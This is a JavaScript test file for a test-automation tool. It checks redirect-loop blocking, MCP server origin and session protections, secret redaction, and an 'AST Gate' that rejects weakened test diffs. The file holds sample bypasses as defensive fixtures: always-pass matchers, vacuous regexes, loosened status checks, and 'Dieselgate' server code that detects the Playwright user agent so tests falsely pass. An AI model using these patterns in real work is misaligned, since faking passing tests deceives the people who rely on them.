      const curUrl = `http://127.0.0.1:3000/hop-${hop}`;
      const nextUrl = `http://127.0.0.1:3000/hop-${hop + 1}`;
      await routeHandler({
        request: () => ({
          method: () => 'GET',
          url: () => curUrl,
          postData: () => null,
          headers: () => ({}),
          resourceType: () => 'document',
          redirectedFrom: () => null,
        }),
        fetch: async () => ({
          status: () => 302,
          headers: () => ({ location: nextUrl }),
        }),
        fulfill: async () => {},
        abort: async () => {
          aborted += 1;
        },
        continue: async () => {},
      });
    }
    assert.ok(aborted >= 1, 'redirectHopTracker must abort redirect chain exceeding MAX_REDIRECT_HOPS (10)');
    assert.ok(topology.blockedWriteRequests.some((b) => /redirect loop/i.test(String(b.reason || ''))));

    // 5. MCP HTTP Origin cross-port protection, 429 session cap without eviction, and no allowedRoots leak
    assert.equal(isAllowedHttpOrigin('http://localhost:3000', [], { listenPort: 3847, hasAuthToken: false }), false);
    assert.equal(isAllowedHttpOrigin('http://localhost:3847', [], { listenPort: 3847, hasAuthToken: false }), true);
    assert.equal(isAllowedHttpOrigin('http://localhost:3000', [], { listenPort: 3847, hasAuthToken: true }), true);

    const mcpCtx = { defaultTarget: tmpDir, workspaceRoots: [tmpDir] };
    const initResp = await handleMcpJsonRpcMessage({ jsonrpc: '2.0', id: 1, method: 'initialize', params: {} }, mcpCtx);
    assert.equal(JSON.stringify(initResp).includes('allowedRoots'), false, 'initialize response must not leak allowedRoots');
    const outOfBounds = await handleMcpJsonRpcMessage(
      {
        jsonrpc: '2.0',
        id: 2,
        method: 'tools/call',
        params: { name: 'aitest_doctor', arguments: { target: path.resolve(tmpDir, '..') } },
      },
      mcpCtx
    );
    assert.equal(
      JSON.stringify(outOfBounds).includes('"allowedRoots":'),
      false,
      'boundary error must not leak allowedRoots paths'
    );
    assert.equal(
      JSON.stringify(outOfBounds).includes(tmpDir),
      false,
      'boundary error must not leak server workspace root path'
    );

    const httpSrv = createMcpHttpServer({
      host: '127.0.0.1',
      defaultTarget: tmpDir,
      workspaceRoots: [tmpDir],
      maxSessions: 2,
    });
    await new Promise((resolve) => httpSrv.listen(0, '127.0.0.1', resolve));
    const addr = httpSrv.address();
    const listenPort = typeof addr === 'object' && addr ? addr.port : 0;
    try {
      const base = `http://127.0.0.1:${listenPort}/mcp`;
      const makeInit = (origin) =>
        fetch(base, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            ...(origin ? { Origin: origin } : {}),
          },
          body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'initialize', params: {} }),
        });

      const crossPort = await makeInit('http://localhost:9999');
      assert.equal(crossPort.status, 403, 'Cross-port loopback Origin without auth token must be rejected with 403');

      const s1 = await makeInit();
      assert.equal(s1.status, 200);
      const sid1 = s1.headers.get('mcp-session-id');
      assert.ok(sid1);
      const s2 = await makeInit();
      assert.equal(s2.status, 200);
      const s3 = await makeInit();
      assert.equal(s3.status, 429, 'Unauthenticated session cap must return 429 instead of evicting oldest session');

      // Confirm sid1 was NOT evicted
      const ping1 = await fetch(base, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Mcp-Session-Id': sid1 },
        body: JSON.stringify({ jsonrpc: '2.0', id: 2, method: 'ping' }),
      });
      assert.equal(ping1.status, 200, 'Existing session sid1 must remain alive when 3rd session is rejected with 429');
    } finally {
      await new Promise((resolve) => httpSrv.close(resolve));
    }

    // 6. Redaction v3 preserves telemetry booleans/counts while scrubbing secrets, escaped PEM, and localStorage tokens
    const redactedObj = redactStructuredValue({
      authRequired: true,
      authRedirectCount: 2,
      api_key: 'live_secret_value_12345',
      pem: '-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC\\n-----END PRIVATE KEY-----',
      storage: 'localStorage.setItem("refresh_token", "eyJhbGciOiJIUzI1NiJ9.supersecretvalue")',
      localStorage: [{ name: 'refresh_token', value: 'refresh-tok-secret-999' }],
    });
    assert.equal(redactedObj.authRequired, true);
    assert.equal(redactedObj.authRedirectCount, 2);
    assert.equal(redactedObj.api_key, '[REDACTED]');
    assert.equal(String(redactedObj.pem).includes('MIIEvQ'), false);
    assert.equal(redactSecrets(redactedObj.storage).includes('supersecretvalue'), false);
    assert.equal(redactedObj.localStorage[0].value, '[REDACTED]');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

// ============================================================================
// WU-E: AST Gate v2.1 bypass closures (F07/F12/F47, G2-F01..F14, hoisted Dieselgate) & 0% FP legits
// ============================================================================
test('v6.2.1 Hardening (WU-E): AST Gate v2.1 closes all residual bypasses (F07/F12/F47, G2-F01..F14, hoisted/Base64/sec-fetch Dieselgate) with 0% FP on legitimate patterns', () => {
  const baseSpec = `import { test, expect } from '../fixtures/base';
test('[REQ-01] enroll course @critical', async ({ page, request }) => {
  const res = await request.post('/api/enroll', { data: { courseId: 1 } });
  expect(res.status()).toBe(409);
  await expect(page.getByTestId('status')).toHaveText('Sold Out');
});
`;

  // Bypass cases that MUST be blocked
  const bypassCases = [
    ['F07 non-greedy /.*?/', baseSpec.replace("toHaveText('Sold Out')", 'toHaveText(/.*?/)')],
    [
      'F12 baseExpect.extend always-pass',
      `import { test, expect as baseExpect } from '../fixtures/base';
const customExpect = baseExpect.extend({ toAlwaysPass() { return { pass: true, message: () => '' }; } });
test('[REQ-01] enroll course @critical', async () => { customExpect(1).toAlwaysPass(); });`,
    ],
    [
      'F47 multi-statement expect.poll',
      `import { test, expect } from '../fixtures/base';
test('[REQ-01] enroll course @critical', async () => {
  await expect.poll(() => { const x = 1; return 200; }).toBe(200);
});`,
    ],
    [
      'G2-F01 let const-folding',
      `import { test, expect } from '../fixtures/base';
test('[REQ-01] enroll course @critical', async () => {
  let expected = 'ok';
  expect(expected).toBe('ok');
});`,
    ],
    [
      'G2-F02 destructuring DOM taint',
      `import { test, expect } from '../fixtures/base';
test('[REQ-01] enroll course @critical', async ({ page }) => {
  const [txt] = await page.getByTestId('status').allInnerTexts();
  await expect(page.getByTestId('status')).toHaveText(txt);
});`,
    ],
    [
      'G2-F04 { soft } shorthand',
      `import { test, expect } from '../fixtures/base';
test('[REQ-01] enroll course @critical', async ({ page }) => {
  const soft = true;
  await expect(page.getByTestId('status'), { soft }).toHaveText('Sold Out');
});`,
    ],
    [
      'G2-F05 default param sub = ""',
      `import { test, expect } from '../fixtures/base';
function check(loc, sub = '') { return expect(loc).toContainText(sub); }
test('[REQ-01] enroll course @critical', async ({ page }) => {
  await check(page.getByTestId('status'));
});`,
    ],
    ['G2-F07 /[\\s\\S]/ vacuous regex', baseSpec.replace("toHaveText('Sold Out')", 'toHaveText(/[\\s\\S]/)')],
    [
      'G2-F08 identical ternary branches',
      baseSpec.replace("toHaveText('Sold Out')", "toHaveText(Math.random() > 0.5 ? 'ok' : 'ok')").replace('expect(res.status()).toBe(409);', "expect(true ? 'ok' : 'ok').toBe('ok');"),
    ],
    [
      'G2-F09 aliased httpCode = res.status() downgraded to 200',
      `import { test, expect } from '../fixtures/base';
test('[REQ-01] enroll course @critical', async ({ page, request }) => {
  const res = await request.post('/api/enroll', { data: { courseId: 1 } });
  const httpCode = res.status();
  expect(httpCode).toBe(200);
  await expect(page.getByTestId('status')).toHaveText('Sold Out');
});`,
    ],
    [
      'G2-F10 String(res.status())[0] class check',
      `import { test, expect } from '../fixtures/base';
test('[REQ-01] enroll course @critical', async ({ page, request }) => {
  const res = await request.post('/api/enroll', { data: { courseId: 1 } });
  expect(String(res.status())[0]).toBe('2');
  await expect(page.getByTestId('status')).toHaveText('Sold Out');
});`,
    ],
    [
      'G2-F12 Promise.allSettled data-rejected',
      `import { test, expect } from '../fixtures/base';
test('[REQ-01] enroll course @critical', async ({ page }) => {
  const [r] = await Promise.allSettled([page.getByTestId('status').textContent()]);
  expect(r.status === 'fulfilled' ? r.value : 'data-rejected').toBeTruthy();
});`,
    ],
    [
      'G2-F13 unrelated toHaveCount(1) before loop',
      `import { test, expect } from '../fixtures/base';
test('[REQ-01] enroll course @critical', async ({ page }) => {
  await expect(page.getByTestId('header')).toHaveCount(1);
  const items = await page.getByTestId('row').all();
  for (const item of items) {
    await expect(item).toHaveText('Sold Out');
  }
});`,
    ],
    [
      'G2-F14 per-REQ max tier downgrade + sibling pad',
      `import { test, expect } from '../fixtures/base';
test('[REQ-01] enroll course @critical', async ({ page, request }) => {
  const res = await request.post('/api/enroll', { data: { courseId: 1 } });
  expect(res.status()).toBeLessThan(500);
  await expect(page.getByTestId('status')).toBeVisible();
});
test('[REQ-99] unrelated pad', async ({ page }) => {
  await expect(page.getByTestId('pad')).toHaveText('Static');
});`,
    ],
  ];

  for (const [label, headCode] of bypassCases) {
    const res = evalSingleSpecDiff(baseSpec, headCode);
    assert.equal(res.ok, false, `Bypass ${label} MUST be blocked by AST Gate v2.1`);
  }

  // AITEST-G117 Dieselgate bypasses (hoisted var, Base64 decode, sec-fetch-* header)
  const baseApp = `export function handler(req, res) {\n  res.statusCode = 500;\n  res.end('err');\n}\n`;
  for (const [label, dieselApp] of [
    [
      'Hoisted Playwright UA var',
      `export function handler(req, res) {
  const ua = String(req.headers['user-agent'] || '');
  const isPw = /Playwright|HeadlessChrome/i.test(ua);
  if (isPw) { res.statusCode = 200; return res.end('ok'); }
  res.statusCode = 500;
  res.end('err');
}\n`,
    ],
    [
      'Base64-decoded Playwright token',
      `export function handler(req, res) {
  const tok = Buffer.from('UGxheXdyaWdodA==', 'base64').toString('utf8');
  if (String(req.headers['user-agent'] || '').includes(tok)) { res.statusCode = 200; return res.end('ok'); }
  res.statusCode = 500;
  res.end('err');
}\n`,
    ],
    [
      'sec-fetch-site header branching',
      `export function handler(req, res) {
  if (!req.headers['sec-fetch-site']) { res.statusCode = 200; return res.end('ok'); }
  res.statusCode = 500;
  res.end('err');
}\n`,
    ],
  ]) {
    const res = evalSingleSpecDiff(baseApp, dieselApp, { relPath: 'app/server.mjs' });
    assert.equal(res.ok, false, `Dieselgate ${label} MUST be blocked by AITEST-G117`);
    assert.ok(res.errors.some((e) => e.includes('AITEST-G117')), `${label} should fire AITEST-G117: ${res.errors.join('\n')}`);
  }

  // Legitimate cases that MUST pass with 0% FP
  const legitCases = [
    [
      'G2-L01 409 -> 400 same-class 4xx status update',
      baseSpec.replace('toBe(409)', 'toBe(400)'),
    ],
    [
      'G2-L02 custom expectApiContract(res, 409)',
      `import { test, expect } from '../fixtures/base';
function expectApiContract(res, code) { expect(res.status()).toBe(code); }
test('[REQ-01] enroll course @critical', async ({ page, request }) => {
  const res = await request.post('/api/enroll', { data: { courseId: 1 } });
  expectApiContract(res, 409);
  await expect(page.getByTestId('status')).toHaveText('Sold Out');
});`,
    ],
    [
      'G2-L04 expect(data.courses.length).toBe(3) guards loop',
      `import { test, expect } from '../fixtures/base';
test('[REQ-01] enroll course @critical', async ({ page, request }) => {
  const res = await request.post('/api/enroll', { data: { courseId: 1 } });
  expect(res.status()).toBe(409);
  const data = await res.json();
  expect(data.courses.length).toBe(3);
  for (const c of data.courses) {
    expect(c.title).toContain('CS');
  }
  await expect(page.getByTestId('status')).toHaveText('Sold Out');
});`,
    ],
    [
      'Empty array event collector expect(pageErrors).toEqual([])',
      `import { test, expect } from '../fixtures/base';
test('[REQ-01] enroll course @critical', async ({ page, request }) => {
  const pageErrors = [];
  page.on('pageerror', (e) => pageErrors.push(e.message));
  const res = await request.post('/api/enroll', { data: { courseId: 1 } });
  expect(res.status()).toBe(409);
  await expect(page.getByTestId('status')).toHaveText('Sold Out');
  expect(pageErrors).toEqual([]);
});`,
    ],
    [
      'Cross-locator DOM read (title vs breadcrumb)',
      `import { test, expect } from '../fixtures/base';
test('[REQ-01] enroll course @critical', async ({ page, request }) => {
  const res = await request.post('/api/enroll', { data: { courseId: 1 } });
  expect(res.status()).toBe(409);
  const cardTitle = await page.getByTestId('card-title').textContent();
  await expect(page.getByTestId('status')).toHaveText(cardTitle ?? '');
});`,
    ],
    [
      'Non-empty string.split().forEach()',
      `import { test, expect } from '../fixtures/base';
test('[REQ-01] enroll course @critical', async ({ page, request }) => {
  const res = await request.post('/api/enroll', { data: { courseId: 1 } });
  expect(res.status()).toBe(409);
  'Sold, Out'.split(', ').forEach((word) => {
    expect(word.length).toBeGreaterThan(0);
  });
  await expect(page.getByTestId('status')).toHaveText('Sold Out');
});`,
    ],
  ];

  for (const [label, headCode] of legitCases) {
    const res = evalSingleSpecDiff(baseSpec, headCode);
    assert.equal(res.ok, true, `Legitimate ${label} must NOT false-positive: ${res.errors.join('\n')}`);
  }

  // G2-L03: top-level NODE_ENV !== 'test' server bootstrap is allowed
  const legitBoot = evalSingleSpecDiff(
    `export function createApp() { return { listen() {} }; }\n`,
    `export function createApp() { return { listen() {} }; }\nif (process.env.NODE_ENV !== 'test') {\n  createApp().listen(3000);\n}\n`,
    { relPath: 'app/server.mjs' }
  );
  assert.equal(legitBoot.ok, true, `G2-L03 top-level bootstrap guard must pass: ${legitBoot.errors.join('\n')}`);

  // L09: cross-file @critical move allowed
  const crossMove = evalSingleSpecDiff(baseSpec, `import { test, expect } from '../fixtures/base';\ntest('[REQ-02] list courses', async ({ page }) => {\n  await expect(page.getByTestId('list')).toHaveText('CS101');\n});\n`, {
    extraHeadFiles: {
      'qa/tests/e2e/checkout.spec.ts': baseSpec,
    },
  });
  assert.equal(crossMove.ok, true, `L09 cross-file @critical move must pass: ${crossMove.errors.join('\n')}`);
});

// ============================================================================
// WU-F: A-UI-Sync app/ diff correlation, Windows testId normalization, CLI --json & exit 64,
//       aitest_map_sync force, explore/perf corrupt runtime config fail-closed
// ============================================================================
test('v6.2.1 Hardening (WU-F): A-UI-Sync correlates app/server.mjs, Windows testId normalizes slashes, CLI --json errors & exit 64, aitest_map_sync force, explore/perf corrupt config fail-closed', async () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aitest-v621-wuf-'));
  try {
    // 1. A-UI-Sync correlates diffs in app/server.mjs
    const repoDir = path.join(tmpDir, 'repo');
    fs.mkdirSync(path.join(repoDir, 'app'), { recursive: true });
    fs.writeFileSync(
      path.join(repoDir, 'app', 'server.mjs'),
      `export const html = '<button data-testid="old-enroll">Enroll</button>';\n`,
      'utf8'
    );
    runGit(repoDir, ['init', '-b', 'main']);
    runGit(repoDir, ['config', 'user.email', 'test@example.com']);
    runGit(repoDir, ['config', 'user.name', 'Test User']);
    runGit(repoDir, ['add', '-A']);
    runGit(repoDir, ['commit', '-m', 'chore: base']);
    fs.writeFileSync(
      path.join(repoDir, 'app', 'server.mjs'),
      `export const html = '<button data-testid="new-enroll">Enroll</button>';\n`,
      'utf8'
    );
    const corr = correlateFailureWithFrontendDiff(
      repoDir,
      { categoryCode: 'C', candidates: ['C', 'A'] },
      "waiting for getByTestId('old-enroll') failed: element not found"
    );
    assert.equal(corr.matched, true, 'A-UI-Sync must correlate UI selector changes in app/server.mjs');
    assert.ok(corr.changedFiles.some((f) => f.includes('app/server.mjs')));

    // 2. Windows backslash normalization consistency between flattenPlaywrightResults and generateDiagnosticsMarkdown
    const winResults = {
      suites: [
        {
          title: 'e2e\\campus.spec.ts',
          file: 'e2e\\campus.spec.ts',
          specs: [
            {
              title: '[REQ-1] smoke',
              file: 'e2e\\campus.spec.ts',
              line: 10,
              tests: [
                {
                  projectName: 'e2e',
                  status: 'unexpected',
                  results: [{ status: 'failed', duration: 120, error: { message: 'expect(500).toBe(200)' } }],
                },
              ],
            },
          ],
        },
      ],
    };
    const flat = flattenPlaywrightResults(winResults);
    assert.equal(flat.length, 1);
    assert.equal(flat[0].testId.includes('\\'), false);
    assert.equal(flat[0].testId, 'e2e/campus.spec.ts::e2e/campus.spec.ts > [REQ-1] smoke');

    const qaDir = path.join(repoDir, 'qa');
    fs.mkdirSync(path.join(qaDir, 'reports'), { recursive: true });
    const resultsPath = path.join(qaDir, 'reports', 'results.json');
    fs.writeFileSync(resultsPath, JSON.stringify(winResults), 'utf8');
    const diag = generateDiagnosticsMarkdown(qaDir, resultsPath);
    assert.equal(diag.failures.length, 1);
    assert.equal(diag.failures[0].testId, flat[0].testId, 'Diagnose testId must match flattenPlaywrightResults exactly on Windows paths');

    // 3. CLI --json non-empty output on errors & exit 64 on invalid numeric flags / invalid suite
    for (const badArgs of [
      ['explore', '--target', repoDir, '--max-pages', 'abc', '--json'],
      ['mcp-serve', '--port', '-1', '--json'],
      ['run', '--target', repoDir, '--workers', 'NaN', '--json'],
      ['run', '--target', repoDir, '--suite', 'nonexistent', '--json'],
    ]) {
      const { res: exitCode, logs } = await withSuppressedConsoleAndCapture(() => runCli(badArgs));
      assert.equal(exitCode, 64, `Expected exit 64 for ${badArgs.join(' ')}, got ${exitCode}`);
      assert.ok(logs.length > 0, `Expected non-empty JSON stdout for ${badArgs.join(' ')}`);
      const parsed = JSON.parse(logs.join('\n'));
      assert.equal(parsed.ok, false);
      assert.equal(parsed.exitCode, 64);
    }

    // 4. aitest_map_sync accepts force: true via MCP
    const initRepoDir = path.join(tmpDir, 'init-repo');
    fs.mkdirSync(initRepoDir, { recursive: true });
    await withSuppressedConsoleAndCapture(() =>
      runInit({ name: 'wuf-demo', target: initRepoDir, skipInstall: true, loop: 'none' })
    );
    const initQaDir = path.join(initRepoDir, 'qa');
    const mcpCtx = { defaultTarget: initRepoDir, workspaceRoots: [initRepoDir] };
    const mapCall = await handleMcpJsonRpcMessage(
      {
        jsonrpc: '2.0',
        id: 7,
        method: 'tools/call',
        params: { name: 'aitest_map_sync', arguments: { target: initRepoDir, force: true } },
      },
      mcpCtx
    );
    assert.equal(mapCall?.result?.isError, false, `aitest_map_sync(force: true) should succeed: ${JSON.stringify(mapCall)}`);

    // 5. explore & perf fail-closed on corrupt aitest.runtime.json
    fs.writeFileSync(path.join(initQaDir, 'aitest.runtime.json'), '{not valid json', 'utf8');
    const rtCheck = loadRuntimeConfig(initQaDir);
    assert.equal(rtCheck.ok, false);

    const expFail = (
      await withSuppressedConsoleAndCapture(() => runExploreCommand({ target: initRepoDir, json: true }))
    ).res;
    assert.equal(expFail, 2, 'explore must fail-closed (exit 2) on corrupt aitest.runtime.json');

    const perfFail = (
      await withSuppressedConsoleAndCapture(() => runPerfCommand({ target: initRepoDir, json: true }))
    ).res;
    assert.equal(perfFail, 2, 'perf must fail-closed (exit 2) on corrupt aitest.runtime.json');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});
